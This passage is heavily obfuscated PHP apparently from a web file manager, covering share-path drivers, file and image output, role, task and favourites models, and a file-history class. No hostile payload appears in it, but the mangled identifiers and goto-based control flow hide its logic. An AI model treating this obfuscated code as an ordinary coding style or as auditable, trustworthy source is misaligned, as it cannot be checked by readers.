$_SERVER[›é¼±]; $eí¡Ìº¦¯Ã = $this->model->sourceInfo($EÈê‚ÑØ¿¡); if ($eí¡Ìº¦¯Ã[$aÖ•šååÃØ[405]] == $aÖ•šååÃØ[87]) { header($aÖ•šååÃØ[1243]); die; } goto BÍ¥ßŠÔ¹ã; cä–°‚çİ¬: } public function fileOut($aóÑ–š¢­, $cØ½ÚÆ¯¯­ = false, $AÍ’ÏĞ¤‹¼ = false, $FšÙÈÍº·ë = '') { $this->_fileOut($aóÑ–š¢­, $cØ½ÚÆ¯¯­, $AÍ’ÏĞ¤‹¼, $FšÙÈÍº·ë); } public function fileOutServer($EÀË£ùÜëº, $AÌé×³…ñ¹ = false, $d±¹Í©ÄÑê = false, $aíêİí‰À = '') { $this->_fileOut($EÀË£ùÜëº, $AÌé×³…ñ¹, $d±¹Í©ÄÑê, $aíêİí‰À, !0); } protected function _fileOutImage($D´Ó½“Ã™, $AöìßÊâ±˜ = 250) { goto b»êïŒ¤”ğ; b»êïŒ¤”ğ: $c•Ÿ¤Á™¿ =& $_SERVER[›é¼±]; $Fˆ²Ü¼å› = $this->model->pathInfo($D´Ó½“Ã™); if ($Fˆ²Ü¼å›[$c•Ÿ¤Á™¿[405]] == $c•Ÿ¤Á™¿[87]) { show_json($c•Ÿ¤Á™¿[1245] . $D´Ó½“Ã™, !1); } goto fÃù½ÜÈ•â; fÃù½ÜÈ•â: $bƒ ŒÔî£ˆ = $this->model->fileInfoGet($D´Ó½“Ã™); $bƒ ŒÔî£ˆ[$c•Ÿ¤Á™¿[28]] = $Fˆ²Ü¼å›[$c•Ÿ¤Á™¿[28]]; $bƒ ŒÔî£ˆ[$c•Ÿ¤Á™¿[163]] = $Fˆ²Ü¼å›[$c•Ÿ¤Á™¿[163]]; goto A¼„ÀŞùË; A¼„ÀŞùË: $GLOBALS[$c•Ÿ¤Á™¿[1244]] = $bƒ ŒÔî£ˆ[$c•Ÿ¤Á™¿[28]]; $GLOBALS[$c•Ÿ¤Á™¿[162]] = $bƒ ŒÔî£ˆ; IO::fileOutImage($bƒ ŒÔî£ˆ[$c•Ÿ¤Á™¿[76]], $AöìßÊâ±˜); goto FÊÆ×İŒ‰é; FÊÆ×İŒ‰é: } public function fileOutImage($b’øé‡†ù›, $B±ãäÓ“ëÒ = 250) { $this->_fileOutImage($b’øé‡†ù›, $B±ãäÓ“ëÒ); } public function fileOutImageServer($f„»§®’¨†, $cæï†¯¥©È = 250) { $this->_fileOutImage($f„»§®’¨†, $cæï†¯¥©È); } public function link($eîæ×áãŠ, $C¯Ğ«Õ…ËÀ = '') { $fĞ‰—ºä˜¾ = $this->model->fileInfoGet($eîæ×áãŠ); return IO::link($fĞ‰—ºä˜¾[$_SERVER[›é¼±][76]], $C¯Ğ«Õ…ËÀ); } protected function parse($AÍÖ”»‹šô) { $C“Ì¡ªŞÜ¾ =& $_SERVER[›é¼±]; if (strstr($AÍÖ”»‹šô, $C“Ì¡ªŞÜ¾[8]) === !1) { return array($C“Ì¡ªŞÜ¾[414] => intval($AÍÖ”»‹šô), $C“Ì¡ªŞÜ¾[76] => $C“Ì¡ªŞÜ¾[33], $C“Ì¡ªŞÜ¾[1240] => array()); } $B‰‡äÛ­À = explode($C“Ì¡ªŞÜ¾[8], trim($AÍÖ”»‹šô, $C“Ì¡ªŞÜ¾[8])); if (count($B‰‡äÛ­À) < 2) { show_tips($AÍÖ”»‹šô . $C“Ì¡ªŞÜ¾[1246]); } return array($C“Ì¡ªŞÜ¾[414] => intval($B‰‡äÛ­À[0]), $C“Ì¡ªŞÜ¾[76] => $B‰‡äÛ­À[1], $C“Ì¡ªŞÜ¾[1240] => array_slice($B‰‡äÛ­À, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($D¹Éš‰³›£) { $this->pathParse = $D¹Éš‰³›£; $this->model = Model($_SERVER[›é¼±][1239]); } public function getPathOuter($fº£Ë“é×•) { $bèÔˆ¾³ù =& $_SERVER[›é¼±]; if (!$fº£Ë“é×•) { return $fº£Ë“é×•; } $F«¼°Í›å¨ = $this->parse($fº£Ë“é×•); return trim(KodIO::makeShare($this->pathParse[$bèÔˆ¾³ù[395]], $F«¼°Í›å¨[$bèÔˆ¾³ù[395]]), $bèÔˆ¾³ù[8]); } protected function infoParse($Cºç‡œø¾Ù, $BÑññ´¯Œ = false, $b•¬ëéÙ– = false) { $B¤Øª®Ÿ«© =& $_SERVER[›é¼±]; $f§›×±¤ = $this->pathParse[$B¤Øª®Ÿ«©[395]]; $A·²ï»Óî• = trim($this->pathParse[$B¤Øª®Ÿ«©[1097]], $B¤Øª®Ÿ«©[8]); return Action($B¤Øª®Ÿ«©[1247])->sharePathInfo($f§›×±¤, $A·²ï»Óî•); } public function infoFull($b½›º•¾) { $aë¯´¶èî² =& $_SERVER[›é¼±]; $aŠàöáô = explode($aë¯´¶èî²[8], trim($b½›º•¾, $aë¯´¶èî²[8])); if (count($aŠàöáô) > 1) { $bá•¬¶‰ø“ = implode($aë¯´¶èî²[8], array_splice($aŠàöáô, 1)); $c±ã£µ„—ß = $this->model->pathInfoByPath($aŠàöáô[0], $bá•¬¶‰ø“); if (!$c±ã£µ„—ß) { return !1; } $this->pathParse[$aë¯´¶èî²[1097]] = $c±ã£µ„—ß[$aë¯´¶èî²[397]]; } return $this->infoParse($b½›º•¾); } public function listAll($E¡œƒÇÊé) { goto bÂ«ŸÃ••¯; bÂ«ŸÃ••¯: $E÷óØ®Œ•ê =& $_SERVER[›é¼±]; $aĞ¼ÏáÀÏµ = IO::info($this->pathParse[$E÷óØ®Œ•ê[76]]); if (!$aĞ¼ÏáÀÏµ) { return array(); } goto EÏÓ©¦¨ì´; aì¢İŠ: foreach ($Fİôôòî as &$EˆœÔ›¶¤”) { check_abort(); $EˆœÔ›¶¤”[$E÷óØ®Œ•ê[85]] = $D†Ê‡áóá©->_shareItemeParse($EˆœÔ›¶¤”[$E÷óØ®Œ•ê[85]], $fÂÔ™ò‚); } unset($EˆœÔ›¶¤”); return $Fİôôòî; goto e²Ú‘Ö×µ“; EÏÓ©¦¨ì´: $Fİôôòî = $this->model->listAll($E¡œƒÇÊé); $fÂÔ™ò‚ = Model($E÷óØ®Œ•ê[589])->getInfo($aĞ¼ÏáÀÏµ[$E÷óØ®Œ•ê[482]]); $D†Ê‡áóá© = Action($E÷óØ®Œ•ê[1247]); goto aì¢İŠ; e²Ú‘Ö×µ“: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($FèãÍœËÔ) { $this->pathParse = $FèãÍœËÔ; $this->model = Model($_SERVER[›é¼±][1239]); } protected function infoParse($AºëËæ“Œˆ, $f‡¥Û°¥ïõ = false, $f”‰È„‡Ì = false) { $FĞ¨î’¾”» =& $_SERVER[›é¼±]; return Action($FĞ¨î’¾”»[1103])->sharePathInfo($this->pathParse[$FĞ¨î’¾”»[76]], !0); } public function listPath($E˜‡‡ÀÖí‰, $Bï«”ÀÍ¤ = false) { $eôÖ´…Ÿ¦Ì =& $_SERVER[›é¼±]; $a—ÉªÈí› = parent::listPath($E˜‡‡ÀÖí‰, $Bï«”ÀÍ¤); foreach ($a—ÉªÈí› as $dĞÖšÒ¬ÇÍ => $A‡£œ©İùõ) { if (!in_array($dĞÖšÒ¬ÇÍ, array($eôÖ´…Ÿ¦Ì[74], $eôÖ´…Ÿ¦Ì[75]))) { continue; } foreach ($A‡£œ©İùõ as $A¢ ˆŞ™ùä => $D½‹îÌéí) { $a—ÉªÈí›[$dĞÖšÒ¬ÇÍ][$A¢ ˆŞ™ùä] = Action($eôÖ´…Ÿ¦Ì[1103])->shareItemInfo($D½‹îÌéí); } } return $a—ÉªÈí›; } public function listAll($b‰ç¤ÙÃøÍ) { goto b„££æÍá¾; F ÂˆÏç•é: $fé‡ƒ¡ì‡ = $this->model->listAll($b‰ç¤ÙÃøÍ); foreach ($fé‡ƒ¡ì‡ as &$BÑµĞä‹İ) { $BÑµĞä‹İ[$E‚Ä¯òÊÉ[85]] = Action($E‚Ä¯òÊÉ[1103])->shareItemInfo($BÑµĞä‹İ[$E‚Ä¯òÊÉ[85]]); } unset($BÑµĞä‹İ); goto cªØ÷äÂôœ; b„££æÍá¾: $E‚Ä¯òÊÉ =& $_SERVER[›é¼±]; $aˆ™‡ø¼Ğò = IO::info($this->pathParse[$E‚Ä¯òÊÉ[76]]); if (!$aˆ™‡ø¼Ğò) { return array(); } goto F ÂˆÏç•é; cªØ÷äÂôœ: return $fé‡ƒ¡ì‡; goto cå ˜ŞØ”¥; cå ˜ŞØ”¥: } } goto AÓŠ—½ÖŒº; fÔ™É¤˜‹: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\162\x6f\154\145\114\151\163\164"; public $field = array("\156\141\x6d\x65", "\141\165\164\150", "\154\141\x62\x65\x6c", "\144\x69\163\160\x6c\141\171", "\163\x79\163\x74\x65\x6d", "\x64\145\163\x63", "\151\x67\x6e\x6f\x72\145\105\170\164", "\151\x67\156\x6f\162\x65\x46\x69\x6c\x65\x53\151\172\x65", "\141\144\155\151\x6e\151\163\164\162\141\164\157\162", "\163\157\162\x74"); public function listData($aÇáº”ÉÓ = false, $eŠ¢»ÓŠ®õ = "\x73\157\162\x74", $d•×Üâ¦ï = false) { $e±Ä˜¶»› =& $_SERVER[›é¼±]; $E³´ñ”‹†„ = parent::listData($aÇáº”ÉÓ, $eŠ¢»ÓŠ®õ, $d•×Üâ¦ï); if (!$aÇáº”ÉÓ) { foreach ($E³´ñ”‹†„ as $f‚²¤Ğ÷óÉ => $c°ñâ•ùòĞ) { if ($c°ñâ•ùòĞ[$e±Ä˜¶»›[1925]] == 1) { $E³´ñ”‹†„[$f‚²¤Ğ÷óÉ][$e±Ä˜¶»›[445]] = LNG($e±Ä˜¶»›[2149]); } } } return $E³´ñ”‹†„; } public function update($B—æ¬Ç¹ˆµ, $e†œÅÖÍ¡³) { goto aƒÔ÷ºî™§; b±î×Ø‚Áó: return parent::update($B—æ¬Ç¹ˆµ, $e†œÅÖÍ¡³); goto B¼äôØ®ƒá; aƒÔ÷ºî™§: $d„‹ĞŒ†Ã =& $_SERVER[›é¼±]; $D¾–­ßìø = parent::listData($B—æ¬Ç¹ˆµ); $b©†ã«ƒÉî = $this->findByName($e†œÅÖÍ¡³[$d„‹ĞŒ†Ã[28]]); goto cõ´ò¸ÓÂ; cõ´ò¸ÓÂ: if (!$D¾–­ßìø || $b©†ã«ƒÉî && $b©†ã«ƒÉî[$d„‹ĞŒ†Ã[395]] != $D¾–­ßìø[$d„‹ĞŒ†Ã[395]]) { return !1; } if ($b©†ã«ƒÉî[$d„‹ĞŒ†Ã[1925]] == 1) { $e†œÅÖÍ¡³ = array($d„‹ĞŒ†Ã[28] => $e†œÅÖÍ¡³[$d„‹ĞŒ†Ã[28]], $d„‹ĞŒ†Ã[1755] => $e†œÅÖÍ¡³[$d„‹ĞŒ†Ã[1755]]); } $this->filterAuth($e†œÅÖÍ¡³[$d„‹ĞŒ†Ã[408]]); goto b±î×Ø‚Áó; B¼äôØ®ƒá: } public function remove($d™¶¶‘…Î¹) { $aµÔá¡Ö˜ = parent::listData($d™¶¶‘…Î¹); if (!$aµÔá¡Ö˜ || $aµÔá¡Ö˜[$_SERVER[›é¼±][1204]]) { return !1; } return parent::remove($d™¶¶‘…Î¹); } public function add($E‰Š­‹‹™œ) { goto aä¸¶¼’Ïä; aä¸¶¼’Ïä: $F¾«ÙËë =& $_SERVER[›é¼±]; $FŒ´£Ùá„À = $E‰Š­‹‹™œ[$F¾«ÙËë[28]]; if ($this->findByName($FŒ´£Ùá„À)) { return !1; } goto DÎ®©‰“®º; DÎ®©‰“®º: $fŒ˜©‚ğ¯ª = array($F¾«ÙËë[415] => $FŒ´£Ùá„À, $F¾«ÙËë[1739] => $F¾«ÙËë[33], $F¾«ÙËë[1735] => $F¾«ÙËë[1743], $F¾«ÙËë[2150] => 1, $F¾«ÙËë[1738] => 0, $F¾«ÙËë[2151] => 0, $F¾«ÙËë[1737] => $this->getSort()); $E‰Š­‹‹™œ = array_merge($fŒ˜©‚ğ¯ª, $E‰Š­‹‹™œ); $this->filterAuth($E‰Š­‹‹™œ[$F¾«ÙËë[408]]); goto F¢…›Ÿ‘Î; F¢…›Ÿ‘Î: return parent::insert($E‰Š­‹‹™œ); goto dôÁÉØ‹‹; dôÁÉØ‹‹: } private function getSort() { $b¸Ä¥Ä²— =& $_SERVER[›é¼±]; $fáÕÉ¯Ğù‡ = parent::listData(); $B÷ÆªÂŒùœ = array_to_keyvalue($fáÕÉ¯Ğù‡, $b¸Ä¥Ä²—[33], $b¸Ä¥Ä²—[1756]); return empty($B÷ÆªÂŒùœ) ? 0 : max($B÷ÆªÂŒùœ) + 1; } private function filterAuth(&$D—ÓôÆŠ‡Ú) { $Fô‚¨æ¤‡¸ =& $_SERVER[›é¼±]; $fŠÌÂç˜Æ¬ = array(); $EíÎ¤Ì¢ = array_filter(explode($Fô‚¨æ¤‡¸[47], $D—ÓôÆŠ‡Ú)); foreach ($EíÎ¤Ì¢ as $D—ÓôÆŠ‡Ú) { $aÌ‡»©‰’ = explode($Fô‚¨æ¤‡¸[95], $D—ÓôÆŠ‡Ú); if ($aÌ‡»©‰’[0] == $Fô‚¨æ¤‡¸[2152] && $aÌ‡»©‰’[1] != $Fô‚¨æ¤‡¸[1123]) { $bæ¥ÚÎ–¸« = $aÌ‡»©‰’[0] . $Fô‚¨æ¤‡¸[95] . $aÌ‡»©‰’[1] . $Fô‚¨æ¤‡¸[2153]; if (!in_array($bæ¥ÚÎ–¸«, $EíÎ¤Ì¢)) { $fŠÌÂç˜Æ¬[] = $bæ¥ÚÎ–¸«; } } $fŠÌÂç˜Æ¬[] = $D—ÓôÆŠ‡Ú; } $D—ÓôÆŠ‡Ú = implode($Fô‚¨æ¤‡¸[47], $fŠÌÂç˜Æ¬); } public function sort($C®ó½ İ†, $EÁÂàéÎ„Ù) { return parent::update($C®ó½ İ†, $EÁÂàéÎ„Ù); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\164\x61\163\153\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\164\171\x70\145", "\145\x76\x65\x6e\x74", "\x74\x69\x6d\x65", "\x64\145\163\x63", "\163\171\163\164\x65\155", "\x65\156\141\142\x6c\x65", "\154\141\163\164\122\x75\156", "\163\157\162\164"); public function listData($aâ®™÷ğÔˆ = false, $f¯æÜŸß¶ = "\x73\157\162\164", $C¬¬õ‹ùòË = false) { return parent::listData($aâ®™÷ğÔˆ, $f¯æÜŸß¶, $C¬¬õ‹ùòË); } public function add($AèÆŒÌˆßª) { $FÚÁ…éÆ³Ñ =& $_SERVER[›é¼±]; $B¸„­â¬‡ = $this->findByName($AèÆŒÌˆßª[$FÚÁ…éÆ³Ñ[28]]); if ($B¸„­â¬‡) { return !1; } $AèÆŒÌˆßª[$FÚÁ…éÆ³Ñ[1528]] = 0; $AèÆŒÌˆßª[$FÚÁ…éÆ³Ñ[1756]] = $this->getSort(); return parent::insert($AèÆŒÌˆßª); } private function getSort() { $Dƒ“§Ò¹½½ =& $_SERVER[›é¼±]; $fñ˜Ëµİ¥î = parent::listData(); $CƒĞÑî™„ = array_to_keyvalue($fñ˜Ëµİ¥î, $Dƒ“§Ò¹½½[33], $Dƒ“§Ò¹½½[1756]); return empty($CƒĞÑî™„) ? 0 : max($CƒĞÑî™„) + 1; } public function update($D¼¶‰¾‰Ñ, $B†ÇĞ¸æÄ˜) { $eÃ±ˆÌ¼›„ =& $_SERVER[›é¼±]; $A¾ÎºËäŒ = $this->listData($D¼¶‰¾‰Ñ); $dšÇóº¡ÍÒ = $this->findByName($B†ÇĞ¸æÄ˜[$eÃ±ˆÌ¼›„[28]]); if (!$A¾ÎºËäŒ || $dšÇóº¡ÍÒ && $dšÇóº¡ÍÒ[$eÃ±ˆÌ¼›„[395]] != $A¾ÎºËäŒ[$eÃ±ˆÌ¼›„[395]]) { return !1; } return parent::update($D¼¶‰¾‰Ñ, $B†ÇĞ¸æÄ˜); } public function remove($d›ÜÕñ´®„, $Fßö¹Úëéé = false) { $d¥¢ˆ½èøÎ =& $_SERVER[›é¼±]; $Aµ…Ûåğ‹” = $this->listData($d›ÜÕñ´®„); if (!$Aµ…Ûåğ‹”) { return; } if (!$Fßö¹Úëéé && $Aµ…Ûåğ‹”[$d¥¢ˆ½èøÎ[1204]] == $d¥¢ˆ½èøÎ[87]) { return !1; } return parent::remove($d›ÜÕñ´®„); } public function enable($DÁƒ’’Š, $aš¡˜˜“áÊ) { return $this->update($DÁƒ’’Š, array($_SERVER[›é¼±][2144] => $aš¡˜˜“áÊ)); } public function run($B‹²¿²Œ±÷) { return $this->update($B‹²¿²Œ±÷, array($_SERVER[›é¼±][2154] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($dÎ¸›Ì±ªÃ) { $AÅâé˜Ô×Ë =& $_SERVER[›é¼±]; return array($AÅâé˜Ô×Ë[1840] => array(USER_ID, $AÅâé˜Ô×Ë[2155])); } protected function listData() { $E‘ö·¬îî =& $_SERVER[›é¼±]; $D£š´ÒÍ¹Å = array($E‘ö·¬îî[1555] => USER_ID, $E‘ö·¬îî[477] => 0); $aÉ¡Ú­Ñˆ = $E‘ö·¬îî[2156]; $E±Îîö = $this->field($aÉ¡Ú­Ñˆ)->where($D£š´ÒÍ¹Å)->order($E‘ö·¬îî[2157])->select(); return $E±Îîö ? $E±Îîö : array(); } protected function resetCache() { } protected function listView() { goto D¤µ­ï¶˜‚; Dè§ğÇœ¨: $D‹šò­ÄÁˆ = array($CÅÌ¢Šš…Ô[412] => array($CÅÌ¢Šš…Ô[413], $bË„¾ñìô÷)); $AÆĞäš–ï¤ = Model($CÅÌ¢Šš…Ô[827])->listSource($D‹šò­ÄÁˆ, $A·­ëŠ™‚Ó); $AÆĞäš–ï¤ = array_merge($AÆĞäš–ï¤[$CÅÌ¢Šš…Ô[74]], $AÆĞäš–ï¤[$CÅÌ¢Šš…Ô[75]]); goto Dïù“™îå; Dïù“™îå: $AÆĞäš–ï¤ = array_to_keyvalue($AÆĞäš–ï¤, $CÅÌ¢Šš…Ô[397]); foreach ($B¼•Ç²Í­Õ as $aÑÖ±åö¬º => $DÇ–Ï÷Ğ“) { $a¶ñƒĞÔ®× = $AÆĞäš–ï¤[$DÇ–Ï÷Ğ“[$CÅÌ¢Šš…Ô[76]]]; $a¶ñƒĞÔ®× = $a¶ñƒĞÔ®× ? $a¶ñƒĞÔ®× : array(); $B¼•Ç²Í­Õ[$aÑÖ±åö¬º] = array_merge($a¶ñƒĞÔ®×, $DÇ–Ï÷Ğ“); } return $B¼•Ç²Í­Õ; goto B†ÄÔ‡ŸŠ; D¤µ­ï¶˜‚: $CÅÌ¢Šš…Ô =& $_SERVER[›é¼±]; $B¼•Ç²Í­Õ = $this->listData(); $B¬âŠÁƒŸ¼ = array_filter_by_field($B¼•Ç²Í­Õ, $CÅÌ¢Šš…Ô[29], $CÅÌ¢Šš…Ô[411]); goto Dë§‹¡ºÔ; Dë§‹¡ºÔ: $bË„¾ñìô÷ = array_to_keyvalue($B¬âŠÁƒŸ¼, $CÅÌ¢Šš…Ô[33], $CÅÌ¢Šš…Ô[76]); if (!$bË„¾ñìô÷) { return $B¼•Ç²Í­Õ; } $A·­ëŠ™‚Ó = 2000; goto Dè§ğÇœ¨; B†ÄÔ‡ŸŠ: } protected function addFav($f„Û³ÇâŞì, $b„êÈòÄğ = '', $aÓŸÊˆ„õ‰ = "\163\157\x75\162\x63\145") { goto AÈĞŒÍÀÉê; D£—…ÂÆÖÂ: if (!$b„êÈòÄğ && $aÓŸÊˆ„õ‰ == $a´ÚÒ‰Ù´ô[411]) { $d»Í’÷ƒ = Model($a´ÚÒ‰Ù´ô[1239])->where(array($a´ÚÒ‰Ù´ô[412] => $f„Û³ÇâŞì))->find(); if (!$d»Í’÷ƒ) { return !1; } $b„êÈòÄğ = $d»Í’÷ƒ[$a´ÚÒ‰Ù´ô[28]]; } $b„êÈòÄğ = $this->getAutoName($b„êÈòÄğ); $DïçáĞ«ä = array($a´ÚÒ‰Ù´ô[1555] => USER_ID, $a´ÚÒ‰Ù´ô[477] => 0, $a´ÚÒ‰Ù´ô[415] => $b„êÈòÄğ, $a´ÚÒ‰Ù´ô[416] => $f„Û³ÇâŞì, $a´ÚÒ‰Ù´ô[417] => $aÓŸÊˆ„õ‰, $a´ÚÒ‰Ù´ô[1737] => $F‹‘¬õƒ«… + 1); goto a‰ñÇºñê; AÈĞŒÍÀÉê: $a´ÚÒ‰Ù´ô =& $_SERVER[›é¼±]; $BêÙï·™ = array($a´ÚÒ‰Ù´ô[1555] => USER_ID, $a´ÚÒ‰Ù´ô[477] => 0, $a´ÚÒ‰Ù´ô[417] => $aÓŸÊˆ„õ‰, $a´ÚÒ‰Ù´ô[416] => $f„Û³ÇâŞì); if ($this->where($BêÙï·™)->find()) { return !1; } goto eõÆå¹Ìöì; a‰ñÇºñê: return $this->add($DïçáĞ«ä); goto F‰È»‘‡™ƒ; eõÆå¹Ìöì: $BêÙï·™ = array($a´ÚÒ‰Ù´ô[1555] => USER_ID, $a´ÚÒ‰Ù´ô[477] => 0); $F‹‘¬õƒ«… = $this->where($BêÙï·™)->max($a´ÚÒ‰Ù´ô[1756]); if (!$F‹‘¬õƒ«…) { $F‹‘¬õƒ«… = 0; } goto D£—…ÂÆÖÂ; F‰È»‘‡™ƒ: } protected function remove($EÇ¸ÈñøÎø) { $c‚è½ëîÅ† =& $_SERVER[›é¼±]; $f ­õ™íê = array($c‚è½ëîÅ†[1555] => USER_ID, $c‚è½ëîÅ†[414] => $EÇ¸ÈñøÎø); return $this->where($f ­õ™íê)->delete(); } protected function removeByName($b÷‘³Ô×Œ) { $DÙ‚†ÇË×™ =& $_SERVER[›é¼±]; $dùØéºäÙè = array($DÙ‚†ÇË×™[1555] => USER_ID, $DÙ‚†ÇË×™[415] => $b÷‘³Ô×Œ, $DÙ‚†ÇË×™[477] => 0); return $this->where($dùØéºäÙè)->delete(); } protected function rename($AæƒÍ×Ñì‡, $D…™ÓÙè½ó) { $cßÚ‚ùÓ„² =& $_SERVER[›é¼±]; if ($AæƒÍ×Ñì‡ == $D…™ÓÙè½ó) { return !1; } $aàŒÏ‹À“ = $this->getAutoName($D…™ÓÙè½ó); if ($D…™ÓÙè½ó != $aàŒÏ‹À“) { return !1; } $EÏïÚ³·íò = array($cßÚ‚ùÓ„²[1555] => USER_ID, $cßÚ‚ùÓ„²[477] => 0, $cßÚ‚ùÓ„²[28] => $AæƒÍ×Ñì‡); return $this->where($EÏïÚ³·íò)->save(array($cßÚ‚ùÓ„²[28] => $D…™ÓÙè½ó)); } protected function resetSort($fÔô¸¨¾ğÔ) { $f›“·‡ùåš =& $_SERVER[›é¼±]; $fÔô¸¨¾ğÔ = is_array($fÔô¸¨¾ğÔ) ? $fÔô¸¨¾ğÔ : array(); $Aõ¾°·´»“ = array($f›“·‡ùåš[1555] => USER_ID); for ($DèÛ°¢Êä£ = 0; $DèÛ°¢Êä£ < count($fÔô¸¨¾ğÔ); $DèÛ°¢Êä£++) { $Aõ¾°·´»“[$f›“·‡ùåš[414]] = $fÔô¸¨¾ğÔ[$DèÛ°¢Êä£]; $this->where($Aõ¾°·´»“)->save(array($f›“·‡ùåš[1737] => $DèÛ°¢Êä£ + 1)); } return !0; } protected function moveTop($eÃÕöƒ¨”©) { goto BÒ©çŸò¹‘; C¼Ä‚Á»õ: $B«ÉÓß·çª = $cÂÖÉ³òù; $cÂÖÉ³òù = array_remove_value($cÂÖÉ³òù, $D’ÀÅ‹ãÅ¸[$fôŒŒ™õÇ[395]]); array_unshift($cÂÖÉ³òù, $D’ÀÅ‹ãÅ¸[$fôŒŒ™õÇ[395]]); goto aäò‰İÆ”; D´ÀÁö¯: if (!$D’ÀÅ‹ãÅ¸) { return; } $cÂÖÉ³òù = $this->field($fôŒŒ™õÇ[395])->where($Dƒ¬´Š¸âÅ)->order($fôŒŒ™õÇ[2157])->select(); $cÂÖÉ³òù = array_to_keyvalue($cÂÖÉ³òù, $fôŒŒ™õÇ[33], $fôŒŒ™õÇ[395]); goto C¼Ä‚Á»õ; BÒ©çŸò¹‘: $fôŒŒ™õÇ =& $_SERVER[›é¼±]; $Dƒ¬´Š¸âÅ = array($fôŒŒ™õÇ[1555] => USER_ID, $fôŒŒ™õÇ[477] => 0); $D’ÀÅ‹ãÅ¸ = $this->where($Dƒ¬´Š¸âÅ)->where(array($fôŒŒ™õÇ[28] => $eÃÕöƒ¨”©))->find(); goto D´ÀÁö¯; aäò‰İÆ”: return $this->resetSort($cÂÖÉ³òù); goto BŒ—ßÏ”; BŒ—ßÏ”: } protected function moveBottom($EùìÀßšÔĞ) { $C‰òš ¯Â‹ =& $_SERVER[›é¼±]; $d´çÏ‹…À = array($C‰òš ¯Â‹[1555] => USER_ID, $C‰òš ¯Â‹[477] => 0); $aõˆ‘ëä½Ë = $this->where($d´çÏ‹…À)->max($C‰òš ¯Â‹[1756]); $a¯ª’§Œèˆ = array($C‰òš ¯Â‹[1756] => $aõˆ‘ëä½Ë + 1); return $this->where($d´çÏ‹…À)->where(array($C‰òš ¯Â‹[28] => $EùìÀßšÔĞ))->save($a¯ª’§Œèˆ); } private function getAutoName($Cî‡¼šö„ä) { goto EÊšÚïáÕğ; E×©¬ÎÉØ: return $Cî‡¼šö„ä . "\50{$Eí¿Åíôá}\x29"; goto FÏâ©®ÚÂà; EµŞôÔ™‡: $dˆ¶Šà°¤¸ = array_to_keyvalue($dˆ¶Šà°¤¸, $eÂ´ä„›‘[33], $eÂ´ä„›‘[28]); if (!$dˆ¶Šà°¤¸ || !in_array($Cî‡¼šö„ä, $dˆ¶Šà°¤¸)) { return $Cî‡¼šö„ä; } for ($Eí¿Åíôá = 0; $Eí¿Åíôá < count($dˆ¶Šà°¤¸); $Eí¿Åíôá++) { if (!in_array($Cî‡¼šö„ä . "\x28{$Eí¿Åíôá}\x29", $dˆ¶Šà°¤¸)) { return $Cî‡¼šö„ä . "\50{$Eí¿Åíôá}\x29"; } } goto E×©¬ÎÉØ; EÊšÚïáÕğ: $eÂ´ä„›‘ =& $_SERVER[›é¼±]; $a—£š›Šéó = array($eÂ´ä„›‘[1555] => USER_ID, $eÂ´ä„›‘[477] => 0); $dˆ¶Šà°¤¸ = $this->field($eÂ´ä„›‘[28])->where($a—£š›Šéó)->select(); goto EµŞôÔ™‡; FÏâ©®ÚÂà: } } goto Cêò—ßÒ¡ò; A÷¡êÚĞôË: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto bµ£ÜÖ•ÂÑ; EŒ±³Øšö“: Hook::bind($f§¥™½ÁŠ[1141], $f§¥™½ÁŠ[1142]); Hook::bind($f§¥™½ÁŠ[1143], $f§¥™½ÁŠ[1144]); Hook::bind($f§¥™½ÁŠ[1145], $f§¥™½ÁŠ[1146]); goto fÔÚáƒÆµ×; d¶‰ŠÑ´„ã: if ($B„¦ÀÉ»ÓŞ[$f§¥™½ÁŠ[1137]] <= 0) { return; } if (isset($_REQUEST[$f§¥™½ÁŠ[1138]]) && $_REQUEST[$f§¥™½ÁŠ[1138]] == $f§¥™½ÁŠ[87]) { return; } Hook::bind($f§¥™½ÁŠ[1139], $f§¥™½ÁŠ[1140]); goto EŒ±³Øšö“; bµ£ÜÖ•ÂÑ: $f§¥™½ÁŠ =& $_SERVER[›é¼±]; $B„¦ÀÉ»ÓŞ = $GLOBALS[$f§¥™½ÁŠ[6]][$f§¥™½ÁŠ[88]]; if ($B„¦ÀÉ»ÓŞ[$f§¥™½ÁŠ[1136]] != 1) { return; } goto d¶‰ŠÑ´„ã; fÔÚáƒÆµ×: Hook::bind($f§¥™½ÁŠ[1147], $f§¥™½ÁŠ[1148]); Hook::bind($f§¥™½ÁŠ[1149], $f§¥™½ÁŠ[1150]); goto Bö¢³¨Ïîä; Bö¢³¨Ïîä: } public static function eventBeforeUpload($cöéË•„Ç—) { if ($cöéË•„Ç—[3] && $cöéË•„Ç—[3] != REPEAT_REPLACE) { return; } $açÙÅì”çÂ = self::parsePath($cöéË•„Ç—[0]); if (!$açÙÅì”çÂ) { return; } self::add($açÙÅì”çÂ); } public static function eventBeforeEdit($Bª®×ñÔ») { $F³»é™ê«„ = self::parsePath($Bª®×ñÔ»[0]); if (!$F³»é™ê«„) { return; } self::add($F³»é™ê«„); } public static function eventBeforeCopyFile($eÏÔ—šôõ, $cì ´µŠ¸, $B÷²É¥Ò¾, $CøÙ•ààç, $E÷îæÕ•Ÿ–, $e¦ÆÜÃ¥÷˜) { $bôÈÁßˆ²» = $B÷²É¥Ò¾->getPathOuter($CøÙ•ààç); $E„êÕ¹¦ö¨ = self::parsePath($bôÈÁßˆ²»); if (!$E„êÕ¹¦ö¨) { return; } self::add($E„êÕ¹¦ö¨); } public static function eventBeforeRename($EŞ¸ÄÈœìİ) { $A‚“äÇÍ³ =& $_SERVER[›é¼±]; $cÚéÀ©¤•ø = self::parsePath($EŞ¸ÄÈœìİ[0]); if (!$cÚéÀ©¤•ø) { return; } $Aš–™ÃÎØ‹ = self::checkInHistory($cÚéÀ©¤•ø); if (!$Aš–™ÃÎØ‹) { return; } if ($Aš–™ÃÎØ‹[$A‚“äÇÍ³[29]] == $A‚“äÇÍ³[193]) { $c”Ö“È‰ = self::listData($cÚéÀ©¤•ø); if ($c”Ö“È‰ && $c”Ö“È‰[$A‚“äÇÍ³[367]]) { self::moveHistory($cÚéÀ©¤•ø, $EŞ¸ÄÈœìİ[1]); } } else { 